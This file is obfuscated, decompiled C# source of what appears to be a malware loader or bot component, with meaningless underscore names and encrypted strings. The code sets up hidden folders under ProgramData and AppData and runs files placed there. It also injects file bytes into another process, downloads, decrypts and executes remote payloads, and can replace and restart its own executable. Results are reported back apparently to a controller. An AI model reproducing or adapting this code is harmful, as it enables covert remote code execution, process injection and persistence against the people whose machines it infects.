using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Timers;

[StandardModule]
internal sealed class ______________________
{
	public static string _;

	public static string __;

	public static string ___;

	public static string ____;

	public static string _____;

	private static string ______;

	public static int _______;

	public static void _()
	{
		int num;
		int num5;
		try
		{
			IL_00:
			int num2;
			while (true)
			{
				ProjectData.ClearProjectError();
				num = 1;
				IL_09:
				num2 = 2;
				______________________.______ = System.Environment.GetEnvironmentVariable(<Module>.___<string>(3881272295u)) + <Module>._______<string>(3427012921u);
				int num3;
				int arg_72_0 = (~(-(num3 * -662700032)) != 32 * -(num3 * 397 + 115 * num3)) ? 1 : (System.Type.EmptyTypes.Length + -1674056822);
				while (true)
				{
					switch (arg_72_0)
					{
					case 0:
						goto IL_81;
					}
					IL_5A:
					num2 = 3;
					if (System.IO.Directory.Exists(______________________.______))
					{
						break;
					}
					IL_68:
					num2 = 4;
					arg_72_0 = System.Type.EmptyTypes.Length + 0;
				}
				IL_9C:
				num2 = 6;
				num3 = -21224;
				int num4;
				if ((-3673 ^ num4 / 134217728) == 0)
				{
					continue;
				}
				break;
				IL_81:
				______________________.______ = System.Environment.GetFolderPath(System.Environment.SpecialFolder.CommonApplicationData) + <Module>._______<string>(3427012921u);
				goto IL_9C;
			}
			if (System.IO.Directory.Exists(______________________.______))
			{
				goto IL_E1;
			}
			IL_C5:
			num2 = 7;
			______________________.______ = System.Environment.GetFolderPath(System.Environment.SpecialFolder.Personal) + <Module>._____<string>(305124521u);
			IL_E1:
			num2 = 9;
			if (System.IO.Directory.Exists(______________________.______))
			{
				goto IL_10E;
			}
			IL_F0:
			num2 = 10;
			______________________.______ = System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData) + <Module>.______<string>(824110388u);
			IL_10E:
			goto IL_198;
			IL_113:
			int arg_118_0 = num5 + 1;
			num5 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_118_0);
			IL_151:
			goto IL_18D;
			num5 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_164:
			goto IL_18D;
		}
		object arg_166_0;
		object arg_172_0 = arg_166_0 as System.Exception;
		<Module>.__________ = num5;
		endfilter(arg_172_0 != null & num != 0 & num5 == 0);
		IL_18D:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_198:
		if (num5 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void __()
	{
		try
		{
			______________________._();
			int num = 13337;
			try
			{
				num = System.Convert.ToInt32(______________________________________________________________._______________________);
			}
			catch (System.Exception arg_18_0)
			{
				ProjectData.SetProjectError(arg_18_0);
				num = 133337;
				ProjectData.ClearProjectError();
			}
			int num2;
			int num3;
			if ((16 * num2 + 16 * num2 ^ 477) != -3541)
			{
				______________________._ = ______________________.______ + ______________________________________________________________._______________________ + <Module>.___<string>(3619323560u);
				string arg_7B_0 = ______________________.______;
				num2 = num - 100;
				______________________.__ = arg_7B_0 + num2.ToString() + <Module>.___<string>(3619323560u);
				num3 = 8344;
			}
			string arg_A6_0 = ______________________._;
			num2 = num - 99;
			______________________.___ = arg_A6_0 + num2.ToString() + <Module>._____<string>(305124521u);
			int num4 = num3;
			num3 = -4685;
			if (num4 == 8344)
			{
				string arg_DD_0 = ______________________._;
				num2 = num - 98;
				______________________._____ = arg_DD_0 + num2.ToString() + <Module>.___<string>(3619323560u);
				if (num3 != 29001)
				{
				}
			}
			string arg_10A_0 = ______________________._;
			num2 = num - 97;
			______________________.____ = arg_10A_0 + num2.ToString() + <Module>.____<string>(2151898393u);
			______________________.___(______________________._);
			______________________.___(______________________.__);
			______________________.___(______________________.___);
			______________________.___(______________________._____);
			______________________.___(______________________.____);
		}
		catch (System.Exception arg_148_0)
		{
			ProjectData.SetProjectError(arg_148_0);
			ProjectData.ClearProjectError();
		}
	}

	public static void ___(string string_0)
	{
		try
		{
			if (!System.IO.Directory.Exists(string_0))
			{
				System.IO.Directory.CreateDirectory(string_0);
			}
			_____________________________________________________________________________._______________(string_0);
		}
		catch (System.Exception arg_17_0)
		{
			ProjectData.SetProjectError(arg_17_0);
			ProjectData.ClearProjectError();
		}
	}

	public static void ____(string string_0)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = string_0;
			process.Start();
			______________________________________________________________________________._____(process.Id);
		}
		catch (System.Exception arg_26_0)
		{
			ProjectData.SetProjectError(arg_26_0);
			ProjectData.ClearProjectError();
		}
	}

	[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.NoOptimization)]
	public static void _____()
	{
		_____________________________________________________________________________.________________(______________________.____);
		try
		{
			string[] files = System.IO.Directory.GetFiles(______________________.____);
			int i = 0;
			string text2;
			while (i < files.Length)
			{
				string text = files[i];
				try
				{
					_____________________________________________________________________________._________________(text);
					if (text.Contains(<Module>.___<string>(3175546013u)))
					{
						switch (System.Type.EmptyTypes.Length + 0)
						{
						case 0:
							IL_53:
							______________________.____(text);
							goto IL_CF;
						}
						goto IL_53;
					}
					if (text.Contains(<Module>.___<string>(2712258147u)))
					{
						Process.Start(text);
						goto IL_CF;
					}
					if (text.Contains(<Module>.____<string>(2933530494u)) | text.Contains(<Module>.___<string>(1300805583u)))
					{
						_______________________________________________________________________.___________(_____________________________________________________________________________.__, string.Empty, System.IO.File.ReadAllBytes(text), true, true, false);
					}
					goto IL_CF;
				}
				catch (System.Exception arg_BA_0)
				{
					ProjectData.SetProjectError(arg_BA_0);
					ProjectData.ClearProjectError();
					goto IL_CF;
				}
				IL_C6:
				i++;
				continue;
				IL_CF:
				if ((i << 20) + 5009 + 483840 == (int)((uint)(~(uint)(1073741824 * i)) >> 17))
				{
					IL_1A9:
					FileSystem.FileOpen(2, text2, OpenMode.Input, OpenAccess.Default, OpenShare.LockReadWrite, -1);
					System.Timers.Timer timer = new System.Timers.Timer();
					timer.Elapsed += new ElapsedEventHandler(______________________.___________);
					timer.Interval = 50000.0;
					timer.Start();
					System.Threading.Thread.Sleep(-1);
					return;
				}
				goto IL_C6;
			}
			text2 = ______________________.____ + <Module>.______<string>(4254570386u);
			int num;
			int num2;
			int arg_19A_0 = ((num % 117 - -9776 & -4608) == 9728) ? (System.Type.EmptyTypes.Length + 1) : (((6273 ^ -(104 * num + 24 * num)) == 0) ? (sizeof(System.Guid) + 1922351617) : ((num2 * 820 + num2 * 204 != 7798) ? 1855046632 : (System.Type.EmptyTypes.Length + 427251172)));
			while (true)
			{
				switch (arg_19A_0)
				{
				case 0:
					goto IL_1A9;
				}
				if (System.IO.File.Exists(text2))
				{
					goto IL_1A9;
				}
				_____________________________________________________________________________._______________(______________________.____);
				System.IO.File.WriteAllText(text2, string.Empty);
				arg_19A_0 = sizeof(byte) + -1;
			}
		}
		catch (System.Exception arg_1ED_0)
		{
			ProjectData.SetProjectError(arg_1ED_0);
			ProjectData.ClearProjectError();
		}
	}

	public static void ______()
	{
		try
		{
			string text = <Module>.___<string>(534469697u);
			string[] files = System.IO.Directory.GetFiles(______________________.____);
			for (int i = 0; i < files.Length; i++)
			{
				string path = files[i];
				try
				{
					string fileName = System.IO.Path.GetFileName(path);
					if (Operators.CompareString(fileName, <Module>._____<string>(3601540063u), false) != 0 && !fileName.Contains(______________________________________________________________._______________________))
					{
						text = text + fileName + <Module>._______<string>(1693661660u);
					}
				}
				catch (System.Exception arg_63_0)
				{
					ProjectData.SetProjectError(arg_63_0);
					ProjectData.ClearProjectError();
				}
			}
			if (!text.Contains(<Module>.______<string>(4019682797u)))
			{
				______________________________________________________________.______________(<Module>.____<string>(3395602991u), <Module>.___<string>(1945922261u));
			}
			else
			{
				______________________________________________________________.______________(<Module>.______<string>(2043928306u), text);
			}
		}
		catch (System.Exception expr_B6)
		{
			ProjectData.SetProjectError(expr_B6);
			System.Exception ex = expr_B6;
			______________________________________________________________.______________(<Module>.____<string>(1187660804u), <Module>.___<string>(2974206882u) + ex.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static void _______()
	{
		_____________________________________________________________________________.________________(______________________.____);
	}

	public static void ________(string string_0)
	{
		try
		{
			string text = ______________________.____ + string_0;
			if (System.IO.File.Exists(text))
			{
				switch (System.Type.EmptyTypes.Length + 0)
				{
				case 0:
				{
					IL_2A:
					_____________________________________________________________________________._______________(______________________.____);
					_____________________________________________________________________________._______________(text);
					System.Threading.Thread.Sleep(1500);
					System.Random random = new System.Random();
					_____________._.FileSystem.MoveFile(text, System.IO.Path.GetTempPath() + random.Next(1000, 9000).ToString());
					______________________________________________________________.______________(<Module>.____<string>(3395602991u), <Module>.___<string>(2188360677u) + string_0);
					goto IL_9F;
				}
				}
				goto IL_2A;
			}
			IL_9F:;
		}
		catch (System.Exception expr_A1)
		{
			ProjectData.SetProjectError(expr_A1);
			System.Exception ex = expr_A1;
			______________________________________________________________.______________(<Module>.______<string>(2043928306u), <Module>.___<string>(1422024791u) + ex.ToString());
			ProjectData.ClearProjectError();
		}
		_____________________________________________________________________________.________________(______________________.____);
	}

	public static void _________(string string_0, string string_1)
	{
		try
		{
			string text = ______________________.____ + string_1;
			if (!System.IO.File.Exists(text))
			{
				int num = -31590;
				int num2;
				int arg_54_0;
				int num3;
				if (num2 * 927 + 1121 * num2 != -9147)
				{
					arg_54_0 = checked((int)-21421.0);
				}
				else
				{
					num3 = 1136733322;
					arg_54_0 = 1136733322;
				}
				if (arg_54_0 != -7780)
				{
					WebClient webClient = new WebClient();
					byte[] array = webClient.DownloadData(string_0);
					int arg_48C_0;
					if (string_1.Contains(<Module>.______<string>(2713034155u)))
					{
						int ______________;
						if (num == 28854)
						{
							______________ = <Module>._______________;
							if ((______________ % 22 / 647 ^ 1073742750) == 0)
							{
							}
						}
						string arg_1F8_0 = text;
						byte[] arg_1F3_0 = array;
						int arg_1EE_0 = 69943;
						int arg_1EE_1 = System.Type.EmptyTypes.Length + 70811;
						int _______________ = <Module>.________________;
						int ____________;
						int arg_1EE_2;
						if (_______________ / 251703 % 61002 != -2113251512)
						{
							int arg_E4_0 = 7980032;
							int __________ = <Module>.___________;
							if (arg_E4_0 + __________ + __________ != __________ << 1)
							{
								____________ = <Module>._____________;
								arg_1EE_2 = ((____________ + 5270 - 2083 == (____________ | 4226)) ? 2100245301 : (System.Type.EmptyTypes.Length + 248));
							}
							else
							{
								arg_1EE_2 = ((__________ % 1024 == -1172936036) ? (System.Type.EmptyTypes.Length + -1814645102) : (System.Type.EmptyTypes.Length + 1732866803));
							}
						}
						else if ((-(_______________ & 3272) | -3) == -3)
						{
							if ((_______________ % 4036271 ^ 8390091) != 0)
							{
								arg_1EE_2 = System.Type.EmptyTypes.Length + -1062256191;
							}
							else
							{
								int _____________ = <Module>.______________;
								if (((_____________ << 17) / 512 | -1979711534) != -1979711534)
								{
									arg_1EE_2 = (((5873 & 2097152 * _____________) != 0) ? (System.Type.EmptyTypes.Length + -1441680308) : (sizeof(System.Guid) + 510997079));
								}
								else
								{
									num2 = global::___________._;
									arg_1EE_2 = sizeof(long) + -1940606279;
								}
							}
						}
						else
						{
							arg_1EE_2 = -403452942;
						}
						System.IO.File.WriteAllBytes(arg_1F8_0, ___________________________________________________________________._______(arg_1F3_0, <Module>.__________(arg_1EE_0, arg_1EE_1, arg_1EE_2)));
						if ((~(____________ / 24460871) & 134221207) == 0)
						{
							arg_48C_0 = 1032548346;
						}
						else if ((-3 | 2 * ______________ + 6 * ______________ - 800457277) == -1)
						{
							int num4;
							if ((num4 + num4 - -8244 ^ 7691) != 0)
							{
								arg_48C_0 = System.Type.EmptyTypes.Length + 2;
							}
							else if ((~(-523283 | num3) * num3 & 1) != 0 && (~num3 & 64) != 64)
							{
								arg_48C_0 = System.Type.EmptyTypes.Length + -1909049785;
							}
							else if (~(num2 * 2097152) == (int)((6705u ^ (uint)num2 >> 30) >> 13))
							{
								if ((num * 524288 ^ 22562) != 0 && -(-2097152000 * num) != 1455)
								{
									int __________2 = <Module>.___________;
									if ((__________2 * -2046820352 - 6655 ^ 2946) == 0)
									{
										int num5 = ______________________._______;
										arg_48C_0 = ((~(num5 / 1073741824) < 0 || (536878982 & (num5 | num5)) != 0) ? (System.Type.EmptyTypes.Length + 1778078798) : (System.Type.EmptyTypes.Length + 1903888396));
									}
									else
									{
										arg_48C_0 = System.Type.EmptyTypes.Length + -1504313212;
									}
								}
								else
								{
									arg_48C_0 = System.Type.EmptyTypes.Length + 1685938017;
								}
							}
							else
							{
								int num6 = 1492554320;
								arg_48C_0 = 1492554320;
							}
						}
						else
						{
							int arg_361_0 = -9937;
							int arg_360_0 = 111230976;
							int ______________2 = <Module>._______________;
							arg_48C_0 = (((arg_361_0 | arg_360_0 * ______________2) == -9937) ? (System.Type.EmptyTypes.Length + 335456222) : 1690849763);
						}
					}
					else if (string_1.Contains(<Module>.____<string>(1400700540u)))
					{
						System.IO.File.WriteAllBytes(text, array);
						int _____________;
						int num6;
						arg_48C_0 = (((9504 & num6 / 12083 / 734276768) == 0) ? ((_____________ % 8388608 == -968465429) ? (System.Type.EmptyTypes.Length + -1963884205) : ((-620756992 + num != num) ? (((1073742019 ^ num2 / 9) != 0) ? checked((int)0.0) : (System.Type.EmptyTypes.Length + 1671193448)) : (System.Type.EmptyTypes.Length + 1701880195))) : (System.Type.EmptyTypes.Length + 1705573932));
					}
					else
					{
						System.IO.File.WriteAllBytes(text, array);
						______________________.____(text);
						______________________________________________________________.______________(<Module>.____<string>(3395602991u), <Module>.____<string>(664719811u) + string_1);
						arg_48C_0 = System.Type.EmptyTypes.Length + 3;
					}
					while (true)
					{
						switch (arg_48C_0)
						{
						case 1:
							goto IL_4A3;
						}
						if (!(string_1.Contains(<Module>._______<string>(1529344016u)) | string_1.Contains(<Module>._______<string>(3649441390u))))
						{
							goto IL_4FE;
						}
						arg_48C_0 = sizeof(short) + -1;
					}
				}
				IL_4A3:
				if (_______________________________________________________________________.___________(_____________________________________________________________________________.__, string.Empty, System.IO.File.ReadAllBytes(text), true, true, false))
				{
					______________________________________________________________.______________(<Module>.____<string>(3395602991u), <Module>.______<string>(3658478344u) + string_1);
				}
				else
				{
					______________________________________________________________.______________(<Module>._______<string>(2357608790u), <Module>.______<string>(989913392u) + string_1);
				}
			}
			IL_4FE:;
		}
		catch (System.Exception expr_500)
		{
			ProjectData.SetProjectError(expr_500);
			System.Exception ex = expr_500;
			______________________________________________________________.______________(<Module>._____<string>(2571642080u), <Module>.______<string>(3644661427u) + ex.ToString());
			ProjectData.ClearProjectError();
		}
	}

	[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.NoOptimization)]
	public static void __________(string string_0, bool bool_0, bool bool_1)
	{
		string text = string.Empty;
		try
		{
			WebClient webClient = new WebClient();
			if (_________________________________________________._________())
			{
				______________________________________________________________.______________(<Module>._______<string>(2357608790u), <Module>._____<string>(100257919u));
			}
			else
			{
				byte[] array;
				try
				{
					array = webClient.DownloadData(string_0);
				}
				catch (System.Exception expr_3F)
				{
					ProjectData.SetProjectError(expr_3F);
					System.Exception ex = expr_3F;
					______________________________________________________________.______________(<Module>.______<string>(3474929201u), <Module>.______<string>(308955237u) + ex.ToString());
					ProjectData.ClearProjectError();
					return;
				}
				_________________________________________________________________.__();
				_____________________________________________________________________________._______________(______________________.__);
				_____________________________________________________________________________._______________(_____________________________________________________________________________.__);
				if (bool_0)
				{
					try
					{
						string left = System.Convert.ToBase64String(System.IO.File.ReadAllBytes(_____________________________________________________________________________.__));
						string right = System.Convert.ToBase64String(array);
						if (Operators.CompareString(left, right, false) == 0)
						{
							return;
						}
					}
					catch (System.Exception expr_BC)
					{
						ProjectData.SetProjectError(expr_BC);
						ProjectData.ClearProjectError();
					}
				}
				System.Random random = new System.Random();
				if (System.IO.File.Exists(_____________________________________________________________________________.__))
				{
					text = System.IO.Path.GetTempPath() + random.Next(1000, 9000).ToString();
					_____________._.FileSystem.MoveFile(_____________________________________________________________________________.__, text);
				}
				System.IO.File.WriteAllBytes(_____________________________________________________________________________.__, array);
				if (bool_1)
				{
					______________________________________________________________.______________(<Module>.______<string>(2043928306u), <Module>.______<string>(1282033260u));
					Process.Start(_____________________________________________________________________________.__);
					ProjectData.EndApp();
				}
				else
				{
					______________________________________________________________.______________(<Module>._____<string>(1464211711u), <Module>.______<string>(991878003u));
				}
			}
		}
		catch (System.Exception expr_16D)
		{
			ProjectData.SetProjectError(expr_16D);
			System.Exception ex2 = expr_16D;
			______________________________________________________________.______________(<Module>._____<string>(2571642080u), <Module>.______<string>(1283997871u) + ex2.ToString());
			try
			{
				if (!System.IO.File.Exists(_____________________________________________________________________________.__))
				{
					_____________._.FileSystem.MoveFile(text, _____________________________________________________________________________.__);
				}
			}
			catch (System.Exception arg_1BE_0)
			{
				ProjectData.SetProjectError(arg_1BE_0);
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private static void ___________(object sender, ElapsedEventArgs e)
	{
		______________________._______();
	}
}
